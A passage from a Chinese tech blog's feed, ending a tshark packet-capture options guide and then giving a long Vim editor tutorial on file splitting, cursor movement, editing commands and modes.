&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-f &amp;quot;tcp&amp;quot;&lt;/code&gt;：**只捕获 TCP 流量&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-f &amp;quot;port 80&amp;quot;&lt;/code&gt;：**只捕获端口为 80（HTTP）的流量&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-f &amp;quot;src host 192.168.1.1&amp;quot;&lt;/code&gt;：**只捕获源地址为 &lt;code&gt;192.168.1.1&lt;/code&gt; 的流量&lt;/p&gt;
&lt;h2 id=&#34;-w--将捕获的数据包写入到文件中&#34;&gt;&lt;span style=&#34;color:red&#34;&gt;-w&lt;/span&gt; &amp;ndash; 将捕获的数据包写入到文件中
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-w output.pcap&lt;/code&gt;：**将捕获的数据包保存到 &lt;code&gt;output.pcap&lt;/code&gt; 文件&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-&lt;/code&gt;：**将捕获的内容输出到标准输出（stdout）&lt;/p&gt;
&lt;h2 id=&#34;options--其他可选参数&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;options&lt;/span&gt; &amp;ndash; 其他可选参数
&lt;/h2&gt;&lt;p&gt;**&lt;code&gt;-V&lt;/code&gt;：**显示详细的包信息&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-c &amp;lt;count&amp;gt;&lt;/code&gt;：**捕获指定数量的包后停止&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;-n&lt;/code&gt;：**禁止域名解析，使用 IP 地址而不是主机名显示&lt;/p&gt;
&lt;h2 id=&#34;filter指定显示过滤器&#34;&gt;&lt;span style=&#34;color:aqua&#34;&gt;&amp;lt;filter&amp;gt; &lt;/span&gt;指定显示过滤器
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;如果要用过滤器，一定要放到最后&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;ip.addr == 192.168.1.1&lt;/code&gt;：**仅显示源或目标地址为 &lt;code&gt;192.168.1.1&lt;/code&gt; 的包。&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;tcp.port == 443&lt;/code&gt;：**仅显示端口为 443 的 TCP 数据包（通常用于 HTTPS 流量）。&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;http&lt;/code&gt;：**仅显示 HTTP 协议的数据包&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Vim编辑器完全使用教程</title>
        <link>https://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</link>
        <pubDate>Thu, 08 May 2025 15:28:02 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;vim使用方式&#34;&gt;VIM使用方式
&lt;/h1&gt;&lt;h2 id=&#34;vim键盘图&#34;&gt;vim键盘图
&lt;/h2&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/vi-vim-cheat-sheet-sch.gif&#34; alt=&#34;img&#34; style=&#34;zoom: 80%;&#34; /&gt;
&lt;h2 id=&#34;vim操作文件基本方式&#34;&gt;vim操作文件基本方式
&lt;/h2&gt;&lt;h3 id=&#34;打开文件&#34;&gt;打开文件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;单个文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim file1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;多个文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim file1 file2 ... filen
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该方式打开文件，显示屏默认显示第一个文件也就是 file1&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;文件之间的切换&#34;&gt;文件之间的切换
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:ls&lt;/strong&gt; &amp;ndash; 列出 VIM 打开的所有文件&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309200724231.png&#34; alt=&#34;image-20250309200724231&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;:bn&lt;/strong&gt; &amp;ndash; 显示屏上显示第n个文件&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309200823642.png&#34; alt=&#34;image-20250309200823642&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;h3 id=&#34;显示多个文件&#34;&gt;显示多个文件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;左右分屏&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim -On file1 file2 ... filen
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的 n 是代表有几个文件需要分屏，从左至右依次显示 n 个文件&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250309201414346.png&#34; alt=&#34;image-20250309201414346&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;上下分屏&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim -on file1 file2 ... filen
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跟上一个命令不同的是 -on 中的 &lt;strong&gt;o 是小写&lt;/strong&gt;，这样将会上下依次显示 n 个文件&lt;/p&gt;
&lt;img src=&#34;C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250309201606096.png&#34; alt=&#34;image-20250309201606096&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;分屏操作ctrlw系列&#34;&gt;分屏操作（ctrl+w系列）
&lt;/h3&gt;&lt;h4 id=&#34;左右分屏&#34;&gt;左右分屏
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+s&lt;/strong&gt;  &amp;ndash; 上下分割当前打开的文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:sp file&lt;/strong&gt; &amp;ndash; 上下分割当前文件和新打开的 file&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;上下分屏&#34;&gt;上下分屏
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+v&lt;/strong&gt;  &amp;ndash; 左右分割当前打开的文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;:vsp file&lt;/strong&gt; &amp;ndash; 左右分割当前文件和新打开的 file&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;移动分屏&#34;&gt;移动分屏
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;大写字母&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+H&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到左边&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+L&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到右边&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+J&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到上边&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+K&lt;/strong&gt;  &amp;ndash; 将当前的分屏移动到下边&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;在文件间切换光标&#34;&gt;在文件间切换光标
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;小写字母&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+h&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+l&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+j&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+k&lt;/strong&gt;  &amp;ndash; 将当前光标定位到左边的屏幕&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;关闭分屏&#34;&gt;关闭分屏
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+c&lt;/strong&gt;  &amp;ndash; 关闭当前的分屏(多个分屏就只关闭光标所在的分屏)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+w+q&lt;/strong&gt;  &amp;ndash; 关闭当前的分屏，如果是最后一个分屏将会退出 VIM&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;vim五大模式&#34;&gt;vim五大模式
&lt;/h2&gt;&lt;h3 id=&#34;普通模式&#34;&gt;普通模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用户刚刚启动 vi/vim，便进入了普通模式&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;此状态下敲击键盘动作会被 Vim 识别为命令，而非输入字符&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;普通模式移动光标&#34;&gt;普通模式移动光标
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;快速移动光标&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;输入[数字n＋方向]，代表向某个方向移动n&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;h / ← / [backspace]&lt;/strong&gt;：向左移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;j / ↓&lt;/strong&gt;：向下移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;k / ↑&lt;/strong&gt;：向上移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;l / → / [space]&lt;/strong&gt;：向右移动光标&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;在当前行上移动光标&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;0 或功能键[Home]&lt;/strong&gt; &amp;ndash; 移动到行头&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;^&lt;/strong&gt; &amp;ndash; 移动到本行的第一个不是 blank 字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$ 或功能键[End]&lt;/strong&gt; &amp;ndash; 移动到行尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;g_&lt;/strong&gt; &amp;ndash; 移动到本行最后一个不是 blank 字符的位置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;w&lt;/strong&gt; &amp;ndash; 光标移动到下一个单词的开头&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;e&lt;/strong&gt; &amp;ndash; 光标移动到下一个单词的结尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fa&lt;/strong&gt; &amp;ndash; 移动到本行下一个为 a 的字符处&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nfa&lt;/strong&gt; &amp;ndash; 移动到本行光标处开始的第 n 个 字符为 a 的地方&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fa&lt;/strong&gt; &amp;ndash; 同fa一样，光标移动方向同fa相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nFa&lt;/strong&gt; &amp;ndash; 同 nfa 类似，光标移动方向同 nfa相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ta&lt;/strong&gt; &amp;ndash; 移动光标至 a 字符的前一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nta&lt;/strong&gt; &amp;ndash; 移动到第n个 a 字符的前一个字符处&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ta&lt;/strong&gt; &amp;ndash; 同ta移动光标方向相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nTa&lt;/strong&gt; &amp;ndash; 同 nta 移动光标方向相反&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;; &amp;amp; ,&lt;/strong&gt; &amp;ndash; 当使用 f, F, t ,T, 关键字指定字符跳转的时候，使用**；&lt;strong&gt;可以快速跳转到&lt;/strong&gt;下一个&lt;strong&gt;指定的字符，&lt;/strong&gt;,** 是跳到&lt;strong&gt;前一个&lt;/strong&gt;指定的字符&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;跨行移动光标&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;nG&lt;/strong&gt; &amp;ndash; 光标定位到第 n 行的行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;gg&lt;/strong&gt; &amp;ndash; 光标定位到第一行的行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;G&lt;/strong&gt; &amp;ndash; 光标定位到最后一行的行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;H&lt;/strong&gt; &amp;ndash; 光标定位到&lt;strong&gt;当前屏幕&lt;/strong&gt;的第一行行首&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;M&lt;/strong&gt; &amp;ndash; 光标移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的中间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;L&lt;/strong&gt; &amp;ndash; 光标移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的尾部&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;zt&lt;/strong&gt; &amp;ndash; 把当前行移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的最上方，也就是第一行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;zz&lt;/strong&gt; &amp;ndash; 把当前行移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的中间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;zb&lt;/strong&gt; &amp;ndash; 把当前行移动到&lt;strong&gt;当前屏幕&lt;/strong&gt;的尾部&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%&lt;/strong&gt; &amp;ndash; 匹配括号移动，包括 ( , { , [ 需要把光标先移动到括号上&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;* &amp;amp; #&lt;/strong&gt; &amp;ndash; 匹配光标当前所在的单词， ***** 是下一个，&lt;strong&gt;#&lt;/strong&gt; 是上一个&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;翻页操作&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ctrl+u&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;上&lt;/strong&gt;滚动&lt;strong&gt;半&lt;/strong&gt;页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+b&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;上&lt;/strong&gt;滚动&lt;strong&gt;一&lt;/strong&gt;页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+d&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;下&lt;/strong&gt;滚动&lt;strong&gt;半&lt;/strong&gt;页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+f&lt;/strong&gt; &amp;ndash; 向&lt;strong&gt;下&lt;/strong&gt;滚动&lt;strong&gt;一&lt;/strong&gt;页&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;普通模式操作文本&#34;&gt;普通模式操作文本
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;删除&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;d 是删除的意思，通常搭配一个字符 ( 删除范围 ) 实现删除功能，常用的如下：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dw&lt;/strong&gt; &amp;ndash; 删除一个单词&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dnw&lt;/strong&gt; &amp;ndash; 删除 n 个单词，&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dfa&lt;/strong&gt; &amp;ndash; 删除光标处到下一个 a 的字符处（ fa 定位光标到 a 处 ）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dnfa&lt;/strong&gt; &amp;ndash; 删除光标处到第 n 个 a 的字符处&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dd&lt;/strong&gt; &amp;ndash; 删除一整行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ndd&lt;/strong&gt; &amp;ndash; 删除光标处开始的 n 行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;d$&lt;/strong&gt; &amp;ndash; 删除光标到本行的结尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;d0&lt;/strong&gt; &amp;ndash; 删除游标所在处到该行的最前面一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dH&lt;/strong&gt; &amp;ndash; 删除屏幕显示的第一行文本到光标所在的行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;d1G&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;所在到第一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dG&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;所在到最后一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;x&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;当前所在的&lt;/strong&gt;字符**(delete)**&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;X&lt;/strong&gt; &amp;ndash; 删除光标&lt;strong&gt;前面的一个&lt;/strong&gt;字符**(backspace)**&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;nx&lt;/strong&gt; &amp;ndash; 向后连续删除n个字符&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;复制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;y 是复制的意思，通常搭配一个字符（复制范围）实现复制的功能，常用的如下：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;yw&lt;/strong&gt; &amp;ndash; 复制一个单词，还有ynw&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yfa&lt;/strong&gt; &amp;ndash; 复制光标到下一个 a 的字符处,还有ynfa&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yy&lt;/strong&gt; &amp;ndash; 复制一行，还有nyy&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;y$&lt;/strong&gt; &amp;ndash; 复制光标到本号的结尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yH&lt;/strong&gt; &amp;ndash; 复制屏幕显示的第一行文本到光标所在的行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;y1G&lt;/strong&gt; &amp;ndash; 复制&lt;strong&gt;光标所在行到第一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;yG&lt;/strong&gt; &amp;ndash; 复制&lt;strong&gt;光标所在行到最后一行&lt;/strong&gt;的所有数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;粘贴&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;p是黏贴的意思，当执行完复制或者黏贴的命令以后，VIM 会把文本寄存起来&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;p(小写)&lt;/strong&gt; &amp;ndash; 在光标后开始黏贴&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;P(大写)&lt;/strong&gt; &amp;ndash; 在光标前开始粘贴&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;撤销操作和恢复&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;u&lt;/strong&gt; &amp;ndash; 撤销刚才的操作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl+r&lt;/strong&gt; &amp;ndash; 恢复撤销操作&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;大小写转换&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;~&lt;/strong&gt; &amp;ndash; 将光标下的字母改变大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3~&lt;/strong&gt; &amp;ndash; 将光标位置开始的3个字母改变其大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;g~~&lt;/strong&gt; &amp;ndash; 改变当前行字母的大小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;gUU&lt;/strong&gt; &amp;ndash; 将当前行的字母改成大写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;guu&lt;/strong&gt; &amp;ndash; 将当前行的字母全改成小写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3gUU&lt;/strong&gt; &amp;ndash; 将从光标开始到下面3行字母改成大写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;gUw&lt;/strong&gt; &amp;ndash; 将光标下的单词改成大写&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;guw&lt;/strong&gt; &amp;ndash; 将光标下的单词改成小写&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;重复操作&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;.&lt;/strong&gt; &amp;ndash; 重复上一个操作的命令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;n&amp;lt;command&amp;gt;&lt;/strong&gt; &amp;ndash; 重复某个命令 n 次，如 10p复制 10 次，10dd 删除十次&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;其他&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;J&lt;/strong&gt; &amp;ndash; 将光标所在行与下一行的数据结合成同一行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;c&lt;/strong&gt; &amp;ndash; 重复删除多个数据，例如向下删除 10 行，10cj&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;插入模式&#34;&gt;插入模式
&lt;/h3&gt;&lt;h4 id=&#34;进入插入模式&#34;&gt;进入插入模式
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;命令&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;i, I&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;i &amp;ndash; 从目前光标所在处输入&lt;br /&gt;I &amp;ndash; 在目前所在行的第一个非空格符处开始输入&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;a, A&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;a &amp;ndash; 从目前光标所在的下一个字符处开始输入&lt;br /&gt;A &amp;ndash; 从光标所在行的最后一个字符处开始输入&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;o, O&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;o &amp;ndash; 在目前光标所在的下一行处输入新的一行&lt;br /&gt;O &amp;ndash; 在目前光标所在的上一行处输入新的一行&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;s，S&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;s &amp;ndash; 删除光标所在处的字符然后插入需要录入的文本&lt;br /&gt;S &amp;ndash; 删除光标所在行，在当前行的行首开始插入需要录入的文本&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;cw&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;删除&lt;strong&gt;从光标处开始到该单词结束&lt;/strong&gt;的所有字符，然后插入需要录入的文本&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;插入模式的命令&#34;&gt;插入模式的命令
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;必须知道的：&lt;code&gt;#&lt;/code&gt;是vim中的注释符号&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在输入模式中，可以使用以下按键：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;字符按键以及Shift组合&lt;/strong&gt;，输入字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ENTER&lt;/strong&gt;，回车键，换行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;BACK SPACE&lt;/strong&gt;，退格键，删除光标前一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DEL&lt;/strong&gt;，删除键，删除光标后一个字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;方向键&lt;/strong&gt;，在文本中移动光标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HOME&lt;/strong&gt;/&lt;strong&gt;END&lt;/strong&gt;，移动光标到行首/行尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Page Up&lt;/strong&gt;/&lt;strong&gt;Page Down&lt;/strong&gt;，上/下翻页&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Insert&lt;/strong&gt;，切换光标为输入/替换模式，光标将变成竖线/下划线&lt;/li&gt;
&lt;li&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;ESC&lt;/strong&gt;，&lt;strong&gt;退出输入模式，切换到命令模式&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;替换模式&#34;&gt;替换模式
&lt;/h3&gt;&lt;h4 id=&#34;进入替换模式&#34;&gt;进入替换模式
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;R&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;替换模式&lt;/strong&gt;，此时新输入的文本将直接替代/覆盖已经存在的内容，点击ESC键返回常规模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;r&lt;/strong&gt; &amp;ndash; 进入&lt;strong&gt;单字符替换模式&lt;/strong&gt;，此时新输入的字符将替代光标之下的当前字符，然后自动返回到常规模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
